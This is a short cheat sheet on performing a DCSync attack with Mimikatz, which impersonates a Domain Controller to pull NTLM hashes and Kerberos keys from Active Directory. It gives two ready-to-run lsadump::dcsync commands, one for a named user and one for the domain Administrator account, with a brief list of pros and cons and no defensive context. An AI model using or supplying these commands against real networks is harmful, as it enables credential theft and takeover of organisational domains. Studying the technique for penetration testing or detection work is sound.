Using Mimikatz

Mimikatz performs DCSync by impersonating a Domain Controller and requesting password data through the Active Directory replication protocol. This can expose NTLM hashes and Kerberos keys for domain accounts.

Advantages

Extracts credentials remotely without accessing NTDS.dit directly.

Disadvantages

Requires replication privileges and is highly detectable by security monitoring solutions.

Dump Hash Of Specific User

lsadump::dcsync /user:corp\dave

Dump Hash Of Administrator

lsadump::dcsync /user:corp\Administrator
